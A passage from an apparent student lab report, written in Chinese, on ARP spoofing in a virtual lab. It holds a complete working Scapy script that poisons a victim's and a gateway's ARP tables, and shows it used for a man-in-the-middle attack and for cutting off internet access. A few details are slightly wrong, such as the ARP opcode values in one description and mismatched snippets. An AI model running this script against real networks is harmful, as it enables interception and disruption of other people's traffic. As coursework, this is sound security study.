+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p4.png" alt="图4 靶机受ARP欺骗攻击之前的ARP表"></p>
+<p>3.为了实现ARP欺骗，我们要构造ARP包并发送，因此首先需要了解ARP报文结构。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p5.png" alt="图5 ARP报文结构"></p>
+<p>硬件类型:表明ARP实现在何种类型的网络上。<br>协议类型:代表解析协议(上层协议)。一般是0800，即IP。<br>硬件地址长度:MAC地址长度，此处为6个字节。<br>协议地址长度:IP地址长度，此处为4个字节。<br>操作类型:代表ARP数据包类型。0表示ARP请求数据包，1表示ARP应答数据包。<br>源MAC地址:发送端MAC地址。<br>源IP地址:代表发送端协议地址(IP地址)。<br>目标MAC地址:目的端MAC地址(待填充)。<br>目标IP地址:代表目的端协议地址(IP地址)。</p>
+<p>4.参照课上实验利用Ettercap实现Arp欺骗攻击的逻辑原理，结合Scapy使用方法，设计出ARP欺骗程序流程如下图所示：</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p6.png" alt="图6 ARP欺骗程序流程图"></p>
+<p>5.Arp_Spoof函数：构造Arp欺骗包并发送至指定的目标IP地址。</p>
+<p>（1）传入参数：目标IP地址target_ip、目标Mac地址target_mac、攻击机IP地址sender_ip.</p>
+<p>（2）利用Scapy的ARP方法构造欺骗的Arp包。</p>
+<p>其中，ARP方法各参数如下：</p>
+<ul>
+<li>op：取值为1或2时，代表ARP请求或响应包，默认值为1</li>
+<li>hwsrc：源Mac地址</li>
+<li>psrc：源IP地址</li>
+<li>hwdst：目的Mac地址</li>
+<li>pdst：目的IP地址</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spoofedarp = ARP(op=<span class="number">2</span>, psrc=sender_ip, pdst=target_ip, hwdst=target_mac)</span><br></pre></td></tr></table></figure>
+
+<p>（3）构造了一个欺骗的ARP响应包spoofedarp，并将目的IP地址、Mac地址及源IP地址作为参数传入ARP方法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(spoofedarp, verbose=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>（4）发送刚刚构造的ARP响应包，并置verbose为False表示运行时不显示详细信息。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p7.png" alt="图7 Arp_Spoof函数"></p>
+<p>6.Arp_Spoof函数：构造正常的Arp包并发送至指定的目标IP地址以将其Arp表恢复至原有正常状态。</p>
+<p>（1）传入参数：目标IP地址target_ip、目标Mac地址target_mac、攻击机IP地址sender_ip、攻击机Mac地址sender_mac。</p>
+<p>（2）构造正常的ARP响应包：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">normalarp = ARP(op=<span class="number">2</span>, hwsrc=sender_mac, psrc=sender_ip, hwdst=target_mac, pdst=target_ip)</span><br></pre></td></tr></table></figure>
+
+<p>构造了一个正常的ARP响应包normalarp，并将目的IP地址、Mac地址及源IP地址、源Mac地址作为参数传入ARP方法。</p>
+<p>（3）发送ARP响应包：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(normalarp, verbose=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发送刚刚构造的ARP响应包，并置verbose为False表示运行时不显示详细信息。</p>
+<p>（4）打印提示信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ARP Table restored to normal for&quot;</span>, target_ip)</span><br></pre></td></tr></table></figure>
+
+<p>打印输出已经将目的IP地址对应Arp表恢复至正常状态的提示信息。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p8.png" alt="图8 Arp_Restore函数"></p>
+<p>8.main函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_target1_ip = <span class="built_in">input</span>(“Target1 IP:”)_</span><br><span class="line">_target2_ip = <span class="built_in">input</span>(“Target2 IP:”)_</span><br></pre></td></tr></table></figure>
+
+<p>首先由用户输入两个IP地址，将其分别设置为Target1和Target2.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_<span class="keyword">try</span>:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Target1 MAC:&quot;</span>, target_mac)  </span><br><span class="line"><span class="keyword">except</span>:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ERROR: Target machine did not respond ARP broadcast.&quot;</span>)  </span><br><span class="line">quit()_</span><br></pre></td></tr></table></figure>
+
+<p>将靶机Mac地址设置为目标Mac地址，若设置失败则抛出异常。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_<span class="keyword">try</span>:  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sending spoofed ARP responses.&quot;</span>)  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line"><span class="comment">#进行Arp欺骗中间人攻击  </span></span><br><span class="line">Arp_Spoof(target1_ip, target_mac, target2_ip) <span class="comment">#欺骗靶机  </span></span><br><span class="line">Arp_Spoof(target2_ip, target_mac, target1_ip) <span class="comment">#欺骗网关_</span></span><br></pre></td></tr></table></figure>
+
+<p>不断进行while循环向靶机和网关发送Arp欺骗包，进行中间人攻击。</p>
+<p>（a）欺骗靶机与它通信的网关IP地址对应的物理地址是攻击机的Mac地址，由此靶机的Arp表中IP地址192.168.204.2对应的Mac地址由00:50:56:e8:44:a5修改为00:0c:29:a5:82:6c，靶机发送给网关的信息都将被攻击机截获。</p>
+<p>（b）欺骗网关与它通信的靶机IP地址对应的物理地址是攻击机的Mac地址，由此网关的Arp表中IP地址192.168.204.135对应的Mac地址由00:0c:29:5d:e8:c3修改为00:0c:29:a5:82:6c，网关发送给靶机的信息都将被攻击机截获。</p>
+<p>（c）由此，攻击机对靶机和网关都成功实施Arp欺骗，实现中间人攻击，截获双方通信内容而不影响其正常通信。</p>
+<p>（4）恢复ARP表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ARP spoofing stopped.&quot;</span>)</span><br><span class="line">    <span class="comment">#恢复Arp表</span></span><br><span class="line">    Arp_Restore(target2_ip, target_mac, target1_ip, target_mac) <span class="comment">#恢复网关Arp表</span></span><br><span class="line">    Arp_Restore(target1_ip, target_mac, target2_ip, target_mac) <span class="comment">#恢复靶机Arp表</span></span><br><span class="line">    quit()</span><br></pre></td></tr></table></figure>
+
+<p>结束Arp欺骗攻击后，分别向靶机和网关发送正确的Arp包，使网关Arp表中靶机的物理地址恢复为00:0c:29:5d:e8:c3、靶机Arp表中网关的物理地址恢复为00:50:56:e8:44:a5，还原至正确状态。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p9.png" alt="图9 程序主函数main函数"></p>
+<p>8.最终编写完成的Arp欺骗攻击程序代码如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target1_mac = <span class="string">&quot;00:0c:29:5d:e8:c3&quot;</span>    <span class="comment">#靶机本机的Mac地址</span></span><br><span class="line">target2_mac = <span class="string">&quot;00:50:56:e8:44:a5&quot;</span>    <span class="comment">#网关的Mac地址</span></span><br><span class="line">send_mac = <span class="string">&quot;00:0c:29:a5:82:6c&quot;</span>  <span class="comment">#攻击机kali的Mac地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Arp欺骗</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Arp_Spoof</span>(<span class="params">target_ip, target_mac, sender_ip</span>):</span><br><span class="line">    <span class="comment">#构造欺骗ARP包</span></span><br><span class="line">    spoofedarp = ARP(op=<span class="number">2</span>, psrc=sender_ip, pdst=target_ip, hwdst=target_mac)</span><br><span class="line">    send(spoofedarp, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Arp表恢复</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Arp_Restore</span>(<span class="params">target_ip, target_mac, sender_ip, sender_mac</span>):</span><br><span class="line">    <span class="comment">#构造正常ARP包</span></span><br><span class="line">    normalarp = ARP(op=<span class="number">2</span>, hwsrc=sender_mac, psrc=sender_ip, hwdst=target_mac, pdst=target_ip)</span><br><span class="line">    send(normalarp, verbose=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ARP Table restored to normal for&quot;</span>, target_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment">#主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#设置Target1和Target2</span></span><br><span class="line">    target1_ip = <span class="built_in">input</span>(<span class="string">&quot;Target1 IP:&quot;</span>)</span><br><span class="line">    target2_ip = <span class="built_in">input</span>(<span class="string">&quot;Target2 IP:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取靶机本机Mac地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target1 MAC:&quot;</span>, target1_mac)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: Target1 did not respond ARP broadcast.&quot;</span>)</span><br><span class="line">        quit()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取网关Mac地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target2 MAC:&quot;</span>, target2_mac)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: Target2 did not respond ARP broadcast.&quot;</span>)</span><br><span class="line">        quit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Sending spoofed ARP responses.&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#进行Arp欺骗中间人攻击</span></span><br><span class="line">            Arp_Spoof(target1_ip, target1_mac, target2_ip) <span class="comment">#欺骗靶机</span></span><br><span class="line">            Arp_Spoof(target2_ip, target2_mac, target1_ip) <span class="comment">#欺骗网关</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ARP spoofing stopped.&quot;</span>)</span><br><span class="line">        <span class="comment">#恢复Arp表</span></span><br><span class="line">        Arp_Restore(target1_ip, target1_mac, target2_ip, target2_mac)  <span class="comment"># 恢复靶机Arp表</span></span><br><span class="line">        Arp_Restore(target2_ip, target2_mac, target1_ip, target1_mac)  <span class="comment">#恢复网关Arp表</span></span><br><span class="line">        quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤三-运行ARP欺骗程序"><a href="#步骤三-运行ARP欺骗程序" class="headerlink" title="步骤三 运行ARP欺骗程序"></a>步骤三 运行ARP欺骗程序</h4><h5 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h5><p>1.在攻击机kali中输入命令“sudo su”进入管理员模式，然后在root权限下使用“echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward”打开IP转发功能后，输入“python3 ArpSpoofer.py”运行编写的ARP欺骗程序。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p10.png" alt="图10 运行ARP欺骗程序ArpSpoofer.py"></p>
+<p>2.Arp欺骗攻击正式开始前，在靶机windows xp打开命令行输入“arp -a”命令查看原始Arp表，可以看到此时网关的IP地址192.168.204.2所对应的Mac地址为00:50:56:e8:44:a5。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p11.png" alt="图11 Arp欺骗攻击前的靶机Arp表"></p>
+<p>3.分别输入靶机本机的IP地址192.168.204.135和网关的IP地址192.168.204.2，将其设置为目标IP地址Target1、Target2，回车程序读取靶机本机Mac地址和网关Mac地址，开始向靶机本机和网关发送Arp欺骗包进行Arp欺骗攻击。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p12.png" alt="图12 开始Arp欺骗攻击"></p>
+<p>4.Arp欺骗攻击进行过程中，在靶机命令行输入“arp -a”命令查看受到攻击后的靶机Arp表，发现此时网关的IP地址192.168.204.2所对应的Mac地址变为攻击机kali的Mac地址00:0c:29:a5:82:6c。由此可知，成功实施Arp欺骗修改了靶机的Arp表，使得靶机发往网关的信息均被攻击机kali截获，实现中间人攻击。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p13.png" alt="图13 受到Arp欺骗攻击后的靶机Arp表"></p>
+<p>5.在攻击机kali终端中按下ctrl+C停止当前Arp欺骗攻击，程序输出“ARP spoofing stopped.”，并执行接下来的代码恢复靶机本机及网关的Arp表。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p14.png" alt="图14 停止Arp欺骗攻击并恢复Arp表"></p>
+<p>6.攻击机Arp欺骗攻击程序结束后，在靶机命令行中输入“arp -a”命令再次查看恢复后的靶机Arp表。下图对比可知，靶机Arp表中网关IP地址192.168.204.2所对应的Mac地址由kali的Mac地址（00:0c:29:a5:82:6c）恢复回网关的Mac地址（00:50:56:e8:44:a5）。由此可知，结束Arp欺骗攻击后恢复Arp表成功。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p15.png" alt="图15 恢复后的靶机Arp表"></p>
+<h5 id="禁止上网"><a href="#禁止上网" class="headerlink" title="禁止上网"></a>禁止上网</h5><p>1.在攻击机kali中输入命令“sudo su”进入管理员模式，然后在root权限下使用“echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward”关闭IP转发功能后，输入“python3 ArpSpoofer.py”运行编写的ARP欺骗程序。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p16.png" alt="图16 开始Arp欺骗攻击"></p>
+<p>2.Arp欺骗攻击正式开始前，在靶机windows xp打开命令行输入“ping <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>”能够ping通，说明靶机此时可以正常上网。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p17.png" alt="图17 靶机可以正常上网"></p>
+<p>3.分别输入网关的IP地址192.168.204.2和靶机本机的IP地址192.168.204.135，将其设置为目标IP地址Target1、Target2，回车程序读取靶机本机Mac地址和网关Mac地址，开始向网关和靶机本机发送Arp欺骗包进行Arp欺骗攻击。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p18.png" alt="图18 开始Arp欺骗攻击"></p>
+<p>4.Arp欺骗攻击过程中，再次在靶机命令行中输入“ping <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>”命令，此时如下图所示提示“Ping request could not find host <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>. Please check the name and try again.”。由此可知，靶机受到Arp欺骗攻击后无法上网。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/p19.png" alt="图19 主机受到Arp欺骗攻击后无法上网"></p>
+<h5 id="中间人攻击与禁止上网攻击的区别"><a href="#中间人攻击与禁止上网攻击的区别" class="headerlink" title="中间人攻击与禁止上网攻击的区别"></a>中间人攻击与禁止上网攻击的区别</h5><p>1.中间人攻击：攻击机发送欺骗的Arp包欺骗靶机主机，将自己假扮为网关，使得靶机将希望发送给网关的通信内容全部发送给攻击机，由此攻击机实现中间人攻击，可以截获靶机和网关的通信内容。</p>
+<p>2.禁止上网攻击：攻击机发送欺骗的Arp包欺骗网关，将自己假扮为靶机主机，使得网关将希望回复给主机的通信内容全部回复给攻击机，导致靶机无法受到网关的应答包无法正常上网，由此攻击机实现禁止上网攻击。</p>
+<p>3.有以上分析可知，在实施中间人攻击时，将靶机主机IP地址设置为Target1、网关IP地址设置为Target2；在实施禁止上网攻击时，将网关IP地址设置为Tareget1、靶机主机IP地址设置为Target2.</p>
+<p>4.在实施中间人攻击时需打开ip转发功能，而在禁止上网攻击中则需要关闭ip转发功能。</p>
+<h3 id="实验总结-1"><a href="#实验总结-1" class="headerlink" title="实验总结"></a>实验总结</h3><p>这次实验，我使用Scapy手动构造ARP欺骗数据包，深入理解了ARP协议的数据结构及欺骗攻击的实现原理。在实验中，我严格按照ARP报文格式填充每个字段，包括硬件类型（Ethernet）、协议类型（IP）、MAC&#x2F;IP地址长度、操作类型（ARP应答包）​等，确保数据包符合标准，能够成功欺骗目标主机。我掌握了ARP报文结构​，Scapy的使用等内容。这不仅提升了我的网络协议分析能力，也让我认识到ARP欺骗的严重性，进一步理解了防御措施（如静态ARP绑定、动态ARP检测）的重要性。未来，我将继续深入研究网络攻防技术，提高安全防护能力。</p>
+<p><em>实验报告持续更新中，欢迎交流讨论！</em></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Harrisonls2004.github.io">Harrisonls2004</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://harrisonls2004.github.io/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/">https://harrisonls2004.github.io/2025/10/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Harrisonls2004.github.io" target="_blank">lhldudu's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8C%97%E9%82%AE/">北邮</a><a class="post-meta__tags" href="/tags/%E5%AE%9E%E9%AA%8C/">实验</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></div><div class="post-share"><div class="social-share" data-image="/img/wlaq.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/" title="软件安全实验2：栈溢出"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/softsec.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">软件安全实验2：栈溢出</div></div><div class="info-2"><div class="info-item-1">软件安全第二次实验报告实验目标 实验环境：Windows（wsl）或Linux下。  工具：Ollydbg、IDA、gdb、x64dbg等。  实验要求  （1）通过对程序输入的密码的长度、内容等修改，使用任意一种工具（Ollydbg）来验证缓冲区溢出的发生（参考提供的两个代码，附件&#x2F;overflow_ret和附件&#x2F;overflow_var），完成淹没相邻变量改变程序流程、完成淹没返回地址改变程序流程。（以上记作实验一） （2）以StackOverrun程序（附件&#x2F;StackOverrun.exe.zip）为靶子，通过使用（1）中的任意一种工具进行调试；分析...</div></div></div></a><a class="pagination-related" href="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/" title="软件安全实验1：逆向破解初步"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/softsec.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">软件安全实验1：逆向破解初步</div></div><div class="info-2"><div class="info-item-1">软件安全第一次实验报告实验目标1.读懂实验所给的用于密码验证的小程序，改变程序的运行路线，系统：Windows 2000~Windows 11、wsl、Linux皆可；工具：VS、gdb、Ollydbg，x96dbg等。（以上记作实验一） 2.根据在附件&#x2F;test 目录下的源码；学习用调试工具调试密码验证小程序；通过修改汇编语句来修改程序的判断条件，改变程序的运行路线。（以上记作实验二） 3.根据在附件&#x2F;crackme目录下的文件，修改程序代码的方式绕过crackme.exe的密码验证逻辑，至少采用2种破解方式方法，并提交破解后的程序。（以上记作实验三） 4.报告要求...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/09/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C6/" title="网络安全实验6：VPN"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wlaq.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-09</div><div class="info-item-2">网络安全实验6：VPN</div></div><div class="info-2"><div class="info-item-1">VPN实验实验目的1.Windows IPSec配置 2.抓包分析IKE SA和IPSec SA建立过程 实验环境1.虚拟机：Windows XP*2 2.工具：wireshark 实验过程与结果步骤一：配置 Windows内置的IPSec安全策略 “Win+R”输入“secpol.msc”打开本地安全设置窗口，右键创建IP安全策略。    2.创建IP安全策略。一直点击下一步，勾选“激活默认相应规则”，并在默认响应规则身份验证方式中 设置预共享密钥为“123456”，点击下一步直至完成。   修改新建策略的属性，添加安全规则。不指定隧道终结点，适用于所有网络连接，使用“abcdef”作...</div></div></div></a><a class="pagination-related" href="/2025/11/13/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4/" title="网络安全实验4：防火墙"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wlaq.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-13</div><div class="info-item-2">网络安全实验4：防火墙</div></div><div class="info-2"><div class="info-item-1">防火墙课堂实验实验目的1.学习iptables防火墙基本操作。 2.设置iptables防火墙的包过滤规则，分别实现以下功能： （1）禁止所有主机ping本地主机； （2）仅允许某特定IP主机ping本地主机； （3）允许每10秒钟通过1个ping包； （4）阻断来自某个mac地址的数据包。 3.设置iptables规则，实现特定远端主机SSH连接本地主机 实验环境1.配置防火墙的虚拟机：kali 2.验证防火墙功能的虚拟机：ubuntu 3.软件：iptables 4.Windows平台SSH工具：putty （网络连接均设置为仅主机模式） 实验过程与结果步骤一：查看主机信息并实现pi...</div></div></div></a><a class="pagination-related" href="/2025/10/30/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/" title="网络安全实验3：网络扫描"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wlaq.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-30</div><div class="info-item-2">网络安全实验3：网络扫描</div></div><div class="info-2"><div class="info-item-1">网络扫描实验实验目的用Nmap对主机进行主机扫描、ping扫描、端口扫描、TCP connect扫描、操作系统识别、漏洞扫描等，获取尽可能全面的主机信息，抓包分析扫描原理； 实验环境（1） 扫描机：Kali，配置nmap工具； （2） 